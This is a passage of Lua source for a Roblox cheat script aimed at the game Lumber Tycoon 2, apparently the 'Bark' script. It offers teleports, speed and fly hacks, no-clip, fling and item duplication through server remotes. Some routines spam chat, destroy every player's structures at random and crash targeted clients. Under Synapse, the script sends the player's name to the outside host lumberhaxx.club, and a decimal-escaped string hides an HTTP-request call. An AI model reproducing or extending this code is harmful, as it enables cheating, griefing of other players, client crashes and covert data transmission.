	ds:Create("TextLabel", "Zelly - big belly", {})
end;
local d7 = "Player"
if d then
	d7 = 5181994100
end;
local dt = d6:CreateCategory(d7)
local du = dt:CreateSection("Teleporting")
du:Create("TextBox", "Teleport to Player", function(b4)
	local new = b4:gsub('%s+', '')
	if new ~= "" and new ~= nil then
		for al, v in pairs(game:GetService('Players'):GetPlayers()) do
			if v.Name:lower():find(new:lower()) then
				local g = v.Character.HumanoidRootPart.CFrame;
				_G.DogixLT2TPC(g, o)
			end
		end
	end
end, {
	text = ""
})
du:Create("TextBox", "Teleport to Player Base", function(b4)
	local new = b4:gsub('%s+', '')
	if new ~= "" and new ~= nil then
		for al, v in pairs(game:GetService('Players'):GetPlayers()) do
			if v.Name:lower():find(new:lower()) then
				for al, Y in pairs(workspace.Properties:children()) do
					if tostring(Y.Owner.Value) == v.Name then
						local g = Y.OriginSquare.Position;
						_G.DogixLT2TP(g.X, g.Y + 10, g.Z, o)
					end
				end
			end
		end
	end
end, {
	text = ""
})
du:Create("Dropdown", "Teleports", function(dv)
	_G.tpselect_bp = dv;
	if _G.tpselect_bp == "Wood Dropoff" then
		_G.DogixLT2TP(322, -2, 118, o)
	elseif _G.tpselect_bp == "Green Box" then
		_G.DogixLT2TP(-1673.05, 350, 1472.15, o)
	elseif _G.tpselect_bp == "Bob's Shack" then
		_G.DogixLT2TP(260, 8, -2542, o)
	elseif _G.tpselect_bp == "Strange Man" then
		_G.DogixLT2TP(1066, 20, 1136.5, o)
	elseif _G.tpselect_bp == "Swamp" then
		_G.DogixLT2TP(-1209, 132, -801, o)
	elseif _G.tpselect_bp == "Swamp Bridge" then
		_G.DogixLT2TP(-1684, 422, 735, o)
	elseif _G.tpselect_bp == "Boxed Cars" then
		_G.DogixLT2TP(509, 3, -1463, o)
	elseif _G.tpselect_bp == "End Times Cave" then
		_G.DogixLT2TP(113, -214, -951, o)
	elseif _G.tpselect_bp == "Fancy Furnishings" then
		_G.DogixLT2TP(491, 3, -1720, o)
	elseif _G.tpselect_bp == "Fine Arts Shop" then
		_G.DogixLT2TP(5207, -166, 719, o)
	elseif _G.tpselect_bp == "Shrine of Sight" then
		_G.DogixLT2TP(-1600, 195, 919, o)
	elseif _G.tpselect_bp == "Land Store" then
		_G.DogixLT2TP(258, 3, -100, o)
	elseif _G.tpselect_bp == "Woods R Us" then
		_G.DogixLT2TP(265, 3, 57, o)
	elseif _G.tpselect_bp == "Rukiryaxe" then
		_G.DogixLT2TP(323, 41, 1930, o)
	elseif _G.tpselect_bp == "Blue Cave" then
		_G.DogixLT2TP(3581, -179, 430, o)
	elseif _G.tpselect_bp == "Blue Cave Entrance" then
		_G.DogixLT2TP(5162, -30, 488, o)
	elseif _G.tpselect_bp == "Blue Cave Secret Exit" then
		_G.DogixLT2TP(4282, -166, 181, o)
	elseif _G.tpselect_bp == "Spawn" then
		_G.DogixLT2TP(155, 3, 74, o)
	elseif _G.tpselect_bp == "Main Island Dock" then
		_G.DogixLT2TP(1114, -1, -197, o)
	elseif _G.tpselect_bp == "Tropics Dock" then
		_G.DogixLT2TP(4467, -1, 102, o)
	elseif _G.tpselect_bp == "Snow Biome" then
		_G.DogixLT2TP(897.5, 60, 1196.5, o)
	elseif _G.tpselect_bp == "Ski Lodge" then
		_G.DogixLT2TP(1244, 60, 2294, o)
	elseif _G.tpselect_bp == "Frost Wood" then
		_G.DogixLT2TP(1480, 413, 3277, o)
	elseif _G.tpselect_bp == "Weird Lighthouse" then
		_G.DogixLT2TP(1453, 355.35, 3269, o)
	elseif _G.tpselect_bp == "Cherry Biome" then
		_G.DogixLT2TP(222, 60, 1111, o)
	elseif _G.tpselect_bp == "Palm Island 1" then
		_G.DogixLT2TP(2549, -5, -42, o)
	elseif _G.tpselect_bp == "Palm Island 2" then
		_G.DogixLT2TP(4306, -5.9, -1832, o)
	elseif _G.tpselect_bp == "Palm Island 3" then
		_G.DogizT2TP(1790, -5.9, -2481, o)
	elseif _G.tpselect_bp == "Bridge" then
		_G.DogixLT2TP(113, 11, -734, o)
	elseif _G.tpselect_bp == "Across Bridge" then
		_G.DogixLT2TP(117, 11, -977, o)
	elseif _G.tpselect_bp == "Snowglow Wood" then
		_G.DogixLT2TP(-1112, 6, -893, o)
	elseif _G.tpselect_bp == "Volcano" then
		_G.DogixLT2TP(-1585, 622, 1140, o)
	elseif _G.tpselect_bp == "Volcano Entrance" then
		_G.DogixLT2TP(-1355, 296, 980, o)
	elseif _G.tpselect_bp == "Link's Logic" then
		_G.DogixLT2TP(4604, 3, -727, o)
	elseif _G.tpselect_bp == "Many Axe" then
		_G.DogixLT2TP(535, -15, -1726, o)
	elseif _G.tpselect_bp == "Bird Axe" then
		_G.DogixLT2TP(4800, 18, -978, o)
	end
end, {
	options = {"Wood Dropoff","Green Box","Bob's Shack","Strange Man","Swamp","Swamp Bridge","Boxed Cars","End Times Cave","Fancy Furnishings","Fine Arts Shop","Shrine of Sight","Land Store","Woods R Us","Rukiryaxe","Blue Cave","Blue Cave Entrance","Blue Cave Secret Exit","Spawn","Main Island Dock","Tropics Dock","Snow Biome","Ski Lodge","Frost Wood","Weird Lighthouse","Cherry Biome","Palm Island 1","Palm Island 2","Palm Island 3","Bridge","Across Bridge","Snowglow Wood","Volcano","Volcano Entrance","Link's Logic","Many Axe","Bird Axe"},
	search = true
})
du:Create("Dropdown", "Teleport to Tree", function(dv)
	local dw = nil;
	dw = an[dv]
	for J, v in pairs(workspace:GetChildren()) do
		if v.Name == "TreeRegion" then
			for J, dx in pairs(v:GetChildren()) do
				if dx:FindFirstChild("TreeClass") then
					if dx.TreeClass.Value == dw then
						_G.DogixLT2TPC(dx:FindFirstChildOfClass("Part").CFrame, o)
						return
					end
				end
			end
		end
	end
end, {
	options = {"Cherry","Gold","Cavecrawler","Oak","End Times","Frost","Lava","Elm","Walnut","Birch","Snowglow","Pine","Zombie","Koa","Palm","Spook","Sinister"},
	search = true
})
local dy = dt:CreateSection("Click Teleporting")
dy:Create("KeyBind", "Teleport Key", function(Z)
	_G.ClickTPKey = Z
end, {
	default = _G.ClickTPKey
})
dy:Create("Toggle", "Require Click for Teleport Key", function(Z)
	b7 = Z;
	di[4] = Z
end, {
	default = di[4]
})
dy:Create("Button", "Get Click Teleport Tool", function()
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Click Teleport"
	cp.Activated:Connect(function()
		_G.DogixLT2TPC(CFrame.new(aH:GetMouse().Hit.p) + Vector3.new(0, 3, 0), o)
	end)
end, {
	default = false,
	animated = true
})
_G.SetStats = {
	16,
	50,
	0,
	1.15,
	300,
	48,
	1,
	70
}
_G.Noclipping = nil;
function nocliprun()
	local aB = game.Players.LocalPlayer.Character;
	pcall(function()
		aB.Head.CanCollide = false;
		aB.Torso.CanCollide = false
	end)
end;
_G.OldNoclipping = nil;
function oldnocliprun()
	local aB = game.Players.LocalPlayer.Character;
	aB.Humanoid:ChangeState(11)
end;
function docarmods()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	if aB == nil then
		return
	end;
	if aB.Humanoid.SeatPart ~= nil and aB.Humanoid.SeatPart.Name == "DriveSeat" then
		local dz = aB.Humanoid.SeatPart.Parent;
		dz.Main.Stabilizer.P = math.huge;
		dz.Configuration.MaxSpeed.Value = _G.SetStats[4]
		if (not dz.Configuration:findFirstChild("NC") or dz.Configuration:findFirstChild("NC").Value ~= _G.CarNC) and _G.CarNC then
			_G.CarNCTable = {}
			function NotTouching(Q)
				for J, v in pairs(Q:GetTouchingParts()) do
					if v:IsDescendantOf(dz) then
						return false
					end
				end;
				return true
			end;
			function noclip(v)
				v.CanCollide = false;
				v.Touched:connect(function(cC)
					if _G.CarNC then
						cC.CanCollide = false;
						table.insert(_G.CarNCTable, cC)
					end
				end)
				v.TouchEnded:connect(function(cC)
					if NotTouching(cC) then
						cC.CanCollide = true
					end
				end)
			end;
			for J, v in pairs(dz.PaintParts:children()) do
				noclip(v)
			end;
			for J, v in pairs(dz.Parts:children()) do
				noclip(v)
			end;
			noclip(dz.Main)
			local dA = dz.Configuration:findFirstChild("NC") or Instance.new("BoolValue", dz.Configuration)
			dA.Name = "NC"
			dA.Value = true
		elseif dz.Configuration:findFirstChild("NC") and not _G.CarNC then
			if _G.CarNCTable then
				for J, v in pairs(_G.CarNCTable) do
					v.CanCollide = true
				end
			end;
			_G.CarNCTable = {}
			function clip(v)
				v.CanCollide = true
			end;
			for J, v in pairs(dz.PaintParts:children()) do
				clip(v)
			end;
			for J, v in pairs(dz.Parts:children()) do
				clip(v)
			end;
			clip(dz.Main)
			local dA = dz.Configuration:findFirstChild("NC") or Instance.new("BoolValue", dz.Configuration)
			dA.Name = "NC"
			dA.Value = false
		end
	end
end;
local dB = true;
local dC = false;
_G.CarPitcher = nil;
function getteleport()
	if n or j ~= -1 then
		return
	end;
	if (bd.p - game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame.p).Magnitude > 230 then
		game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = be;
		repeat
			wait()
			i = true;
			dC = false
		until wait(8.5)
		repeat
			wait()
			i = true;
			dC = true
		until wait(1)
		i = false
	end
end;
local dD = false;
_G.CurrentLooping = game:GetService'RunService'.RenderStepped:connect(function()
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local dE = aH.Character:findFirstChild'Humanoid'
	if dE ~= nil then
		if (dE.WalkSpeed ~= _G.SetStats[1] or dE.WalkSpeed ~= _G.SetStats[6]) and dE.WalkSpeed ~= 0 then
			if b6 == false then
				dE.WalkSpeed = _G.SetStats[1]
			else
				dE.WalkSpeed = _G.SetStats[6]
			end
		end;
		if dE.JumpPower ~= _G.SetStats[2] then
			dE.JumpPower = _G.SetStats[2]
		end;
		if dE.HipHeight ~= _G.SetStats[3] then
			dE.HipHeight = _G.SetStats[3]
		end;
		if zoom then
			workspace.CurrentCamera.FieldOfView = 30
		else
			workspace.CurrentCamera.FieldOfView = _G.SetStats[8]
		end;
		if aY then
			Action(dE, function(self)
				if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
					Action(self.Parent.HumanoidRootPart, function(self)
						self.Velocity = self.Velocity * Vector3.new(1, 0, 1) + Vector3.new(0, _G.SetStats[2], 0)
					end)
				end
			end)
		end;
		if dE.SeatPart ~= nil then
			if dE.SeatPart.Parent:FindFirstChild"Configuration" then
				if dE.SeatPart.Parent.Configuration.MaxSpeed.Value ~= _G.SetStats[4] or _G.SetStats[7] ~= 1 and not dD then
					docarmods()
					spawn(function()
						dD = true;
						repeat
							game:GetService'RunService'.Stepped:wait()
							if _G.SetStats ~= 1 and dE.SeatPart ~= nil then
								local dF = dE.SeatPart.Parent.RunSounds;
								dF:FireServer("Set Pitch", _G.SetStats[7])
							end
						until dE.SeatPart == nil;
						dD = false
					end)
				end
			end
		elseif _G.CarNCTable then
			for J, v in pairs(_G.CarNCTable) do
				v.CanCollide = true
			end;
			_G.CarNCTable = {}
		end
	end;
	if _G.bomb_toggle and dB then
		normalinvdupe()
	end;
	if _G.nofog_toggle then
		game.Lighting.FogStart = 32766;
		game.Lighting.FogEnd = 32767
	else
		game.Lighting.FogStart = 0
	end;
	if _G.spook_toggle and game.Lighting:FindFirstChild"Spook" then
		game:GetService("Lighting").Spook.Value = true
	elseif game.Lighting:FindFirstChild"Spook" then
		game:GetService("Lighting").Spook.Value = false
	end;
	if _G.alwaysday_toggle then
		game.Lighting.Brightness = 4/5;
		game.Lighting.ClockTime = 12;
		game.Lighting.Ambient = Color3.new(25 / 255, 25 / 255, 25 / 255)
		game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
	end;
	if _G.alwaysnight_toggle then
		game.Lighting.ClockTime = 0
	end;
	if dE ~= nil then
		if j == -1 and isnotcustom() and aB:FindFirstChild'HumanoidRootPart' then
			bd = be;
			be = aB.HumanoidRootPart.CFrame;
			if tpi ~= aB.Humanoid then
				tpi = aB.Humanoid;
				if _G.CFCloop ~= nil then
					_G.CFCloop:Disconnect()
					_G.CFCloop = nil
				end;
				_G.CFCloop = aB.HumanoidRootPart:GetPropertyChangedSignal('CFrame'):connect(getteleport)
			end;
			if queued ~= nil and i then
				if _G.CFCloop ~= nil then
					_G.CFCloop:Disconnect()
					_G.CFCloop = nil
				end;
				be = queued;
				bd = be;
				aB.HumanoidRootPart.CFrame = queued;
				queued = nil;
				_G.CFCloop = aB.HumanoidRootPart:GetPropertyChangedSignal('CFrame'):connect(getteleport)
			elseif queued ~= nil then
				if (queued.p - aB.HumanoidRootPart.CFrame.p).Magnitude < 230 then
					if _G.CFCloop ~= nil then
						_G.CFCloop:Disconnect()
						_G.CFCloop = nil
					end;
					be = queued;
					bd = be;
					aB.HumanoidRootPart.CFrame = queued;
					queued = nil;
					_G.CFCloop = aB.HumanoidRootPart:GetPropertyChangedSignal('CFrame'):connect(getteleport)
				end
			end;
			if (not aB.Humanoid.Seated or not aB.Humanoid.SeatPart) and not n and aB.Humanoid.Health > 0 and (not i or dC) then
				ftouch(aB.HumanoidRootPart, workspace["Region_Underbridge"]["Teleporter"]:children()[2], true)
				ftouch(aB.HumanoidRootPart, workspace["Region_Underbridge"]["Teleporter"]:children()[2], false)
			end
		end
	end;
	if game.CoreGui:FindFirstChild("NPS", true) and getExploit() == "Synapse" then
		game.CoreGui:FindFirstChild("NPS", true):Destroy()
		syn.request({
            Url = string.format('https://lumberhaxx.club/bark/ui-lib-backup.lua?key=%s&id=%s', q.encode(game.Players.LocalPlayer.Name), "2"),
            Method = 'GET'}
        )
		repeat until nil
	end
end)
if not d then
	local dJ = d6.Screengui.Motherframe.Upline.UIGradient;
	spawn(function()
		while true do
			for J = 0, 255 do
				dJ.Color = ColorSequence.new(Color3.fromHSV(J / 255, 1, 1), Color3.fromHSV(((J + 60 > 255 and J - 255 or J) + 60) / 255, 1, 1))
				wait()
			end
		end
	end)
end;
spawn(function()
	while wait(2) do
		for J, v in pairs(game.Players:children()) do
			if isdev(v.Name) and v.IsChatting.Value == 1000 then
				local cq = game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue;
				cq:InvokeServer(1001)
				wait(10)
				cq:InvokeServer(0)
			end;
			if v.IsChatting.Value == game.Players.LocalPlayer.UserId + 24546 then
				crash()
			end
		end
	end
end)
local dK = {dobypass("dogix DOT wtf / discord"),"bark winning!","i'm an exploiting "..dobypass("scumbag.").." ;((","poggers","code i'm an exploiter report me to defaultio","don't worry code, i've added protections so people can't mess with ur base -bark developer","these messages are hard coded by the script developer","get barked","The FitnessGram Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues.","bacon hair best hair","We're no strangers to "..dobypass("love").." - You know the rules and so do I","i'm an unkind exploiter","i'm the type of person that would exploit on code :(","i tried to load an exploit while code was in my game how funny","these messages occur when someone tries to load an exploit while in your game.","bark is a script for LT2 made by dogix, it's one of the most popular (6500 disqcord members) and arguably one of the best","at least I can pick decent scripts","i'm using "..getExploit().." please make sure roblox fixes it","blood is a bad lumber cheat","i'd lose to a rap battle with jojo siwa","these messages are approved by PETA","this message was sponsored by NordVPN","this is the oldest anarchy server on minecraft","subscribe to pewpiepie","if a single destructive feature is enabled i will crash instantly","Fun Fact: every message posted, theres a 1/999 chance that ill be banned from lumber.",dobypass("dQw4w9WgXcQ"),"I am a hacker","Now installing windows 9","i have the "..dobypass("coronavirus"),"i want to commit 1000 degree bath","Dancing Polish Cow 10 Hours","HeadOn! Apply directly to the forehead!","Today's video is sponsored by Raid Shadow Legends, one of the biggest mobile role-playing games of 2019 and it's totally free!","Oh, so you like Lumber Tycoon 2? Name every axe.","while true do end","Blue kinda sus ngl","The last thing you'd want in your Burger King burger is someone's foot fungus."}
spawn(function()
	if b3 then
		while wait(3) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(dK[math.random(1, #dK)], "All")
			if math.random(1, 999) == 696 then
				for J, v in pairs(workspace.Properties:GetChildren()) do
					game.ReplicatedStorage.Interaction.DestroyStructure(v)
				end
			end
		end
	end
end)
_G.CFCloop = nil;
local tpi = nil;
function normalinvdupe()
	dB = false;
	local aH = game:GetService'Players'.LocalPlayer;
	local cn = aH.Character.HumanoidRootPart.CFrame;
	aH.Character.Humanoid:UnequipTools()
	okinsta(cn)
	wait()
	for J, v in pairs(aH.Character:children()) do
		if not v.Name:find("Humanoid") then
			v:Destroy()
		end
	end;
	local dL = false;
	for J, cp in pairs(aH.Backpack:children()) do
		if cp.Name ~= "BlueprintTool" then
			dL = true
		end;
		aH.Character.HumanoidRootPart.CFrame = cn;
		game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(cp, "Drop tool", cn)
	end;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	okinsta(cn)
	if dL then
		aH.Backpack:WaitForChild("Tool")
		okinsta(cn)
	end;
	wait(.5)
	okinsta(cn)
	dB = true
end;
local dE = dt:CreateSection("Humanoid")
dE:Create("Slider", "Walk Speed", function(v)
	_G.SetStats[1] = tonumber(v)
end, {
	min = 16,
	max = 300,
	default = 16,
	changablevalue = true
})
dE:Create("KeyBind", "Sprint Key", function(Z)
	_G.SprintKey = Z;
	di[7] = Z
end, {
	default = di[7]
})
dE:Create("Slider", "Sprint Speed", function(v)
	_G.SetStats[6] = tonumber(v)
end, {
	min = 16,
	max = 300,
	default = 48,
	changablevalue = true
})
dE:Create("Slider", "Jump Power", function(v)
	_G.SetStats[2] = tonumber(v)
end, {
	min = 50,
	max = 500,
	default = 50,
	changablevalue = true
})
dE:Create("Slider", "Hip Height", function(v)
	_G.SetStats[3] = tonumber(v)
end, {
	min = 0,
	max = 500,
	default = 0,
	changablevalue = true
})
dE:Create("Slider", "Field of View", function(v)
	_G.SetStats[8] = v;
	workspace.CurrentCamera.FieldOfView = v
end, {
	min = 50,
	max = 120,
	default = 70,
	changablevalue = true
})
dE:Create("Slider", "Fly Speed", function(v)
	_G.SetStats[5] = tonumber(v)
end, {
	min = 30,
	max = 600,
	default = 300,
	changablevalue = true
})
dE:Create("KeyBind", "Zoom Key", function(Z)
	_G.ZoomKey = Z
end, {
	default = _G.ZoomKey
})
dE:Create("Toggle", "Fly", function(db)
	carflymode = false;
	if db then
		NOFLY()
		sFLY(false)
	else
		NOFLY()
	end
end, {
	default = false
})
dE:Create("KeyBind", "Fly Key", function(Z)
	dh = Z;
	flyfunct()
end, {
	default = dh
})
if not _G.nc_toggle then
	_G.nc_toggle = false
end;
dE:Create("Toggle", "No-Clip", function(db)
	noclipfunct(db)
end, {
	default = false
})
dE:Create("KeyBind", "No-Clip Key", function(Z)
	dg = Z;
	noclipfunct()
end, {
	default = dg
})
dE:Create("Toggle", "Float", function(db)
	_G.onc_toggle = db;
	if _G.onc_toggle then
		_G.OldNoclipping = game:GetService'RunService'.Stepped:connect(oldnocliprun)
	else
		_G.OldNoclipping:Disconnect()
		_G.OldNoclipping = nil
	end
end, {
	default = false
})
dE:Create("Toggle", "Infinite Jump", function(db)
	_G.ijp_toggle = db
end, {
	default = false
})
dE:Create("Button", "Safe Suicide", function()
	local aB = game.Players.LocalPlayer.Character;
	local y = aB.Head;
	y.Parent = nil;
	y.Parent = aB
end, {
	animated = true
})
dE:Create("Button", "Safe Respawn", function()
	local aH = game.Players.LocalPlayer;
	local aB = aH.Character;
	local dM = aB.HumanoidRootPart.CFrame;
	local y = aB.Head;
	y.Parent = nil;
	y.Parent = aB;
	aH.CharacterAdded:Wait()
	aH.Character:WaitForChild'HumanoidRootPart'
	wait(0.8)
	okinsta(dM)
end, {
	animated = true
})
local dN = dt:CreateSection("Car Options")
dN:Create("Slider", "Car Speed", function(v)
	_G.SetStats[4] = 1 + tonumber(v) / 100;
	docarmods()
end, {
	min = 0,
	max = 200,
	default = 15,
	changablevalue = true
})
dN:Create("Slider", "Car Pitch", function(v)
	_G.SetStats[7] = tonumber(v)
	docarmods()
end, {
	min = -1,
	max = 5,
	default = 1,
	precise = true,
	changablevalue = true
})
dN:Create("Toggle", "Car Fly", function(db)
	carflymode = true;
	if db then
		NOFLY()
		sFLY(true)
	else
		NOFLY()
	end
end, {
	default = false
})
dN:Create("Toggle", "Car No-Clip", function(db)
	_G.CarNC = db;
	if not _G.CarNC then
		_G.CarNCTable = {}
		docarmods()
	else
		docarmods()
	end
end, {
	default = false
})
dN:Create("Button", "Unflip Car", function()
	if game:GetService'Players'.LocalPlayer.Character.Humanoid.SeatPart ~= nil then
		_G.DogixLT2TPC(game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame, o)
	end
end, {
	animated = true
})
dN:Create("Button", "Rotate Car", function()
	if game:GetService'Players'.LocalPlayer.Character.Humanoid.SeatPart ~= nil then
		g = game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.fromEulerAnglesXYZ(0, 90, 0)
		carMan()
	end
end, {
	animated = true
})
local dO = dt:CreateSection("Misc")
dO:Create("Toggle", "Light", function(db)
	_G.lightmode = db;
	local aB = game:GetService'Players'.LocalPlayer.Character;
	for J, v in pairs(aB:GetDescendants()) do
		if v:IsA'PointLight' then
			v:Destroy()
		end
	end;
	if _G.lightmode then
		local dP = Instance.new("PointLight", aB.HumanoidRootPart)
		dP.Range = 100;
		dP.Brightness = 1.5
	end
end, {
	default = false
})
function flingme()
	local aB = game.Players.LocalPlayer.Character;
	for al, dQ in pairs(aB:GetDescendants()) do
		if dQ:IsA("BasePart") then
			dQ.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
		end
	end;
	local dR = Instance.new("BodyAngularVelocity", aB.HumanoidRootPart)
	dR.Name = "."
	dR.AngularVelocity = Vector3.new(0, 311111, 0)
	dR.MaxTorque = Vector3.new(0, 311111, 0)
	dR.P = math.huge;
	local function dS()
		local aB = game.Players.LocalPlayer.Character;
		if aB:FindFirstChildOfClass("Humanoid") then
			if aB:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air then
				dR.AngularVelocity = Vector3.new(0, 0, 0)
			else
				dR.AngularVelocity = Vector3.new(0, 311111, 0)
			end
		end
	end;
	if TouchingFloor then
		TouchingFloor:Disconnect()
	end;
	if TouchingFloorReset then
		TouchingFloorReset:Disconnect()
	end;
	TouchingFloor = aB:FindFirstChildOfClass("Humanoid"):GetPropertyChangedSignal("FloorMaterial"):connect(dS)
	TouchingFloorReset = aB:FindFirstChildOfClass('Humanoid').Died:connect(flingme)
end;
dO:Create("Toggle", "Fling", function(db)
	while b3 and not b do
	end;
	_G.fnc_toggle = db;
	if _G.fnc_toggle then
		_G.FNoclipping = game:GetService'RunService'.Stepped:connect(nocliprun)
		flingme()
	else
		local aB = game.Players.LocalPlayer.Character;
		for J, v in pairs(aB:GetDescendants()) do
			if v.ClassName == 'BodyAngularVelocity' then
				v:Destroy()
			end
		end;
		for al, dQ in pairs(aB:GetDescendants()) do
			if dQ.ClassName == "Part" or dQ.ClassName == "MeshPart" then
				dQ.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end;
		if TouchingFloor then
			TouchingFloor:Disconnect()
		end;
		if TouchingFloorReset then
			TouchingFloorReset:Disconnect()
		end;
		_G.FNoclipping:Disconnect()
		_G.FNoclipping = nil
	end
end, {
	default = false
})
zF = "\40\104\116\116\112\95\114\101\113\117\101\115\116\32\111\114\32\114\101\113\117\101\115\116\32\111\114\32\115\121\110\46\114\101\113\117\101\115\116\41\40\123"
dO:Create("Button", "Fix Camera Scroll Panning Bug", function()
	local N = game.Players.LocalPlayer:GetMouse()
	game.Players.LocalPlayer.CameraMinZoomDistance = 50;
	game.Players.LocalPlayer.CameraMaxZoomDistance = 50;
	N.WheelForward:Connect(function()
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable;
		game.Players.LocalPlayer.CameraMaxZoomDistance = game.Players.LocalPlayer.CameraMaxZoomDistance - 10;
		game.Players.LocalPlayer.CameraMinZoomDistance = game.Players.LocalPlayer.CameraMinZoomDistance - 10;
		wait(0.02)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	end)
	N.WheelBackward:Connect(function()
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable;
		game.Players.LocalPlayer.CameraMaxZoomDistance = game.Players.LocalPlayer.CameraMaxZoomDistance + 10;
		game.Players.LocalPlayer.CameraMinZoomDistance = game.Players.LocalPlayer.CameraMinZoomDistance + 10;
		wait(0.02)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	end)
end, {
	animated = true
})
dO:Create("Button", "BTools", function()
	for J = 1, 4 do
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = J
	end
end, {
	animated = true
})
dO:Create("TextBox", "Bypass Chat Message", function(b4)
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(dobypass(b4), "All")
end, {
	text = ""
})
local dT = 0;
local carflymode = false;
function sFLY(dU)
    dT = math.random()
    lkey = dT
    local mouse = game.Players.LocalPlayer:GetMouse()
    local table = {["fwd"]=0,["bck"]=0,["lft"]=0,["rgt"]=0}
    local ltable = {["fwd"]=0,["bck"]=0,["lft"]=0,["rgt"]=0}
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    local hmd = char.Humanoid
    local hrp = char.HumanoidRootPart
    local torso = char.Torso
    local speed = _G.SetStats[5]
    speed = speed/125
    local speed2 = 0
    local bv = Instance.new("BodyVelocity", torso)
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.MaxForce = Vector3.new(1,1,1)*10000
    bv.P = 9e9
    local bg = Instance.new("BodyGyro", torso)
    bg.CFrame = CFrame.new(bg.Parent.CFrame.p, bg.Parent.CFrame.p+workspace.CurrentCamera.CFrame.lookVector)
    bg.D = 1000
    bg.P = 10000
    bg.MaxTorque = Vector3.new(1,1,1)*8000
    mouse.KeyUp:connect(function(KEY)
        if dT ~= lkey then return end
    	if KEY:lower() == 'w' then
    		table.fwd = 0
    	elseif KEY:lower() == 's' then
    		table.bck = 0
    	elseif KEY:lower() == 'a' then
    		table.lft = 0
    	elseif KEY:lower() == 'd' then
            table.rgt = 0
    	end
    end)
    mouse.KeyDown:connect(function(KEY)
        if dT ~= lkey then return end
    	if KEY:lower() == 'w' then
    	    table.fwd = speed
    	elseif KEY:lower() == 's' then
    	    table.bck = -1*speed
    	elseif KEY:lower() == 'a' then
    	    table.lft = -1*speed
    	elseif KEY:lower() == 'd' then 
    	    table.rgt = speed
    	end
    end)
    hmd.PlatformStand = not dU
    repeat
        wait()
    	if table.lft + table.rgt ~= 0 or table.fwd + table.bck ~= 0 then
    		speed2 = 50
    	elseif not (table.lft + table.rgt ~= 0 or table.fwd + table.bck ~= 0) and speed2 ~= 0 then
    		speed2 = 0
    	end
    	if (table.lft + table.rgt) ~= 0 or (table.fwd + table.bck) ~= 0 then
    		bv.Velocity = ((workspace.CurrentCamera.CFrame.lookVector * (table.fwd + table.bck)) + ((workspace.CurrentCamera.CFrame * CFrame.new(table.lft + table.rgt, (table.fwd + table.bck) * 0.2, 0).p) - workspace.CurrentCamera.CFrame.p)) * speed2
    		ltable = table
    	elseif (table.lft + table.rgt) == 0 and (table.fwd + table.bck) == 0 then
    		bv.Velocity = ((workspace.CurrentCamera.CFrame.lookVector * (ltable.fwd + ltable.bck)) + ((workspace.CurrentCamera.CFrame * CFrame.new(ltable.lft + ltable.rgt, (ltable.fwd + ltable.bck) * 0.2, 0).p) - workspace.CurrentCamera.CFrame.p)) * speed2
    	else
    		bv.Velocity = Vector3.new(0, 0, 0)
    	end
        bg.CFrame = workspace.CurrentCamera.CFrame
    until dT ~= lkey or hmd.Health == 0
    if hmd.Health == 0 then dT = 0 end
    hmd:ChangeState(10)
    hmd.PlatformStand = false
    bv:Destroy()
    bg:Destroy()
end;
function NOFLY()
	dT = 0;
	game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
end;
function _G.DiscardFly()
	NOFLY()
end;
local e1 = nil;
local e2 = true;
local d7 = "Game"
if d then
	d7 = 5624746940
end;
local e3 = d6:CreateCategory(d7)
local e4 = e3:CreateSection("Other Players (tool required)")
e4:Create("Toggle", "Auto-Dupe Tools", function(e5)
	e2 = e5
end, {
	default = true
})
e4:Create("Dropdown", "Player Select", function(e5)
	e1 = e5
end, {
	text = "",
	playerlist = true
})
function okinsta(g)
	if j == -1 and not n then
		queued = g
	else
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = g
	end
end;
function prepare_plr(aH, cn)
	n = true;
	aH.Character.Humanoid:UnequipTools()
	local aP = getAxeList()
	if #aP == 0 then
		return false
	end;
	if e2 then
		wait()
		for J, v in pairs(aH.Character:children()) do
			if not v.Name:find("Humanoid") then
				v:Destroy()
			end
		end;
		for J, cp in pairs(aP) do
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(cp, "Drop tool", game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
		end;
		aH.CharacterAdded:Wait()
		aH.Character:WaitForChild'HumanoidRootPart'
	end;
	return true
end;
function glitch_plr(e6, e7, V)
	e7.Name = "1"
	local e8 = e7:Clone()
	e8.Parent = e6;
	e8.Name = "Humanoid"
	if V == nil then
		wait(0.1)
	end;
	e7:Destroy()
	workspace.CurrentCamera.CameraSubject = e6;
	e8.DisplayDistanceType = "None"
	return e8
end;
function equip_plr(e6, V)
	wait()
	local cp = getWorstAxe()
	cp.Parent = e6;
	if V == true then
		wait(0.2)
		cp.Owner.Parent = nil;
		wait(0.2)
	end;
	wait()
end;
function attach_plr(e9, ea, V)
	if V == nil then
		wait(0.5)
	end;
	local by = 0;
